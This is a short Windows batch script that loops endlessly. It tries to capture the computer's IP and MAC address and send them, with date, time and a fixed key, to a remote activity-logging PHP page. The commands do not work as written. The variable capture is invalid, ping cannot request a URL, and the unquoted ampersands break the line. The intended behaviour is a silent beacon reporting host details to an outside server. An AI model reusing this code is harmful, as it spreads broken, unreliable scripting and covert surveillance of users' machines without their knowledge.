@echo off
:loop
set ipmac=ipconfig /all | findstr Direcc
ping -n 10 prestadoresosunlar.edu.ar:88/logactividadpc.php?ip=%ipmac%&date=%date%&time=%time%&key=asjdbasjdbsajdasd > nul
goto loop